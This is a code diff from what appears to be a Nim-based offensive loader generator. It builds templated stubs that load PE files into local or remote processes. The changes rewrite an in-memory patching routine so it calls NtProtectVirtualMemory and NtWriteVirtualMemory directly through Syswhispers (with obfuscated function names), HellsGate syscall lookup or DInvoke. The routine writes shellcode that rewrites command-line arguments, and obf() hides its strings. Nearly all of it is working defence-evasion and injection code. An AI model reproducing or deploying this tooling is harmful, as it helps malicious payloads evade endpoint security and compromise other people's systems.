@@ -524,10 +524,55 @@ when defined(args):
         var oldProtect: DWORD = 0
         var lpAddress = targetAddr
         var dwSize = cast[SIZE_T](len(data))
-        var hProcess = MyGetCurrentProcess()
-        success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-        copyMem(lpAddress, unsafeAddr data[0], len(data))
-        success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+        var status: NTSTATUS = 0x00000000
+        when defined(DInvoke):
+            var hProcess = MyGetCurrentProcess()
+        else:
+            var hProcess = GetCurrentProcess()
+        when defined(Syswhispers):
+            status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
+            echo obf("NtProtectVirtualMemory: "),toHex(status)
+            if (status != 0):
+                echo obf("[-] Failed to change memory protections.")
+                echo toHex(status)
+        else:
+            when defined(HellsGate):
+                if getSyscall(ntProtectTable):                
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
+            if (status != 0):
+                echo obf("[-] Failed to change memory protections.")
+                echo toHex(status)
+            
+        when defined(Hellsgate):
+            if getSyscall(ntWriteTable):
+                syscall = ntWriteTable.wSysCall
+            else:
+                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+        var scLength: SIZE_T = SIZE_T(len(data))
+        var bytesWritten: SIZE_T
+            
+        when defined(Syswhispers):
+            status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
+        else:
+            status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
+            echo obf("NtWriteVirtualMemory: "),toHex(status)
+            if (status != 0):
+                echo obf("[-] Failed to write arguments.")
+                echo toHex(status)
+            else:
+                echo obf("[+] Arguments written successfully.")
+        when defined(Syswhispers):
+            status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+        else:
+            when defined(HellsGate):
+                if getSyscall(ntProtectTable):                
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
 when defined(args):
     proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
         when defined x86:
@@ -539,28 +584,7 @@ when defined(args):
         shellcode.add(byte(0xc3)) # ret
         patchMemory(funcAddr, shellcode)
 """
-let WhispersPatchargsFuncs = fmt"""
-var arguments: string = "{arguments}"
-when defined(args):
-    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
-        var oldProtect: DWORD = 0
-        var lpAddress = targetAddr
-        var dwSize = cast[SIZE_T](len(data))
-        var hProcess = MyGetCurrentProcess()
-        success =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-        copyMem(targetAddr, unsafeAddr data[0], len(data))
-        success =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
-when defined(args):
-    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
-        when defined x86:
-            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
-        else:
-            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
-        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
-            shellcode.add t        
-        shellcode.add(byte(0xc3)) # ret
-        patchMemory(funcAddr, shellcode)
-"""
+
 
 let RemoteProcImportStub = """
 import osproc
@@ -1117,20 +1141,16 @@ if(dll_out):
 
 if (peload):
     if (localinject):
+        if (embeddedArguments):
+            stub.add(PatchargsFuncs)
         if (hellsgate):
-            if (embeddedArguments):
-                stub.add(PatchargsFuncs)
             stub.add(HellsgateAllocDelegate)
             stub.add(PELoadStub)
         elif(getfreshstub):
-            if (embeddedArguments):
-                stub.add(PatchargsFuncs)
             stub.add(NtAllocateVirtualMemoryDelegate)
             stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
         elif(syswhispers):
-            if (embeddedArguments):
-                stub.add(WhispersPatchargsFuncs)
             stub.add(PELoadStub)
     else:   
         stub.add(RemoteProcImportStub)
